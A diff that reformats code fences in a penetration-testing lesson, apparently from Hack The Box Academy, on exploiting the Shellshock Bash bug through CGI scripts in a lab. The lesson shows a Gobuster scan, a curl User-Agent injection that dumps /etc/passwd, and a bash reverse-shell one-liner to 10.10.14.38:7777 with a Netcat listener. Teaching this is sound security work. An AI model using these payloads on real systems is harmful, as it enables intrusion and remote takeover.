@@ -39,8 +39,7 @@ Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, "Bash 
 
 The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable. Let's look at a simple example where we define an environment variable and include a malicious command afterward.
 
-```
-        shellsession
+```shellsession
 $ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
 ```
 
@@ -48,8 +47,7 @@ When the above variable is assigned, Bash will interpret the `y='() { :;};'` por
 
 If the system is not vulnerable, only `"not vulnerable"` will be printed.
 
-```
-        shellsession
+```shellsession
 $ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
 
 not vulnerable
@@ -67,8 +65,7 @@ Let's look at a hands-on example to see how we, as pentesters, can find and expl
 
 We can hunt for CGI scripts using a tool such as `Gobuster`. Here we find one, `access.cgi`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 
 ===============================================================
@@ -94,8 +91,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi
 
 HTTP/1.1 200 OK
@@ -109,8 +105,7 @@ Content-Type: text/html
 
 To check for the vulnerability, we can use a simple `cURL` command or use Burp Suite Repeater or Intruder to fuzz the user-agent field. Here we can see that the contents of the `/etc/passwd` file are returned to us, thus confirming the vulnerability via the user-agent field.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
 
 root:x:0:0:root:/root:/bin/bash
@@ -153,15 +148,13 @@ kim:x:1000:1000:,,,:/home/kim:/bin/bash
 
 Once the vulnerability has been confirmed, we can obtain reverse shell access in many ways. In this example, we use a simple Bash one-liner and get a callback on our Netcat listener.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
 ```
 
 From here, we could begin hunting for sensitive data or attempt to escalate privileges. During a network penetration test, we could try to use this host to pivot further into the internal network.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 7777
 
 listening on [any] 7777 ...
